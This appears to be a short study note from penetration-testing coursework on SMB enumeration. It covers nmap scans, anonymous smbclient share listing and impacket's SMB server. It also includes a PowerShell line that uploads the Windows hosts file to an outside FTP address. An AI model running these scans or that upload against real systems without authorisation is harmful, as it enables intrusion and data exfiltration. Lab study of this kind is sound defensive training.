smb
#####

Date: 2024-11-02 15:45

Status:

Description
***********

SMB (Server Message Block) Common port TCP/445 CIFS ( Common internet
file system) Unix derivative

SMB Version
**************

The version can be enumerated with:

.. code-block:: console

   sudo nmap 10.129.14.128 -sV -sC -p139,445

If more information is needed, there is a tool called
`rpcclient <rpcclient>`__

Other useful tools for enumeration:

-  `SMBMap <SMBMap>`__

-  `CrackMapExec <CrackMapExec>`__

-  `enum4linux-ng <enum4linux-ng>`__

smbclient
*********

Connecting to SMB server via the command line can be done with the
smbclient command.

Anonymous Authentication
****************************

Example: ( -L list server shares, -N for anonymous connection )

.. code-block:: console


   smbclient -N -L //10.129.14.128

Then connect to a share called notes with:

.. code-block:: console

   smbclient //10.129.14.28/notes

Simulating SMB with Python
****************************

There is a small package written in python that creates a simple SMB
service from impacket called
`smbserver.py <https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py>`__

From the Windows powershell you can use the builtin client to send
files:

.. code-block:: console


   PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

Enumerating SMB
****************

Example 1: Using a script scan

.. code-block:: console

   sudo nmap 10.129.14.13 -sV -sC -p139,445

References
****************
`python smb
server <https://academy.hackthebox.com/module/24/section/160#questionsDiv>`__
https://academy.hackthebox.com/module/112/section/1067
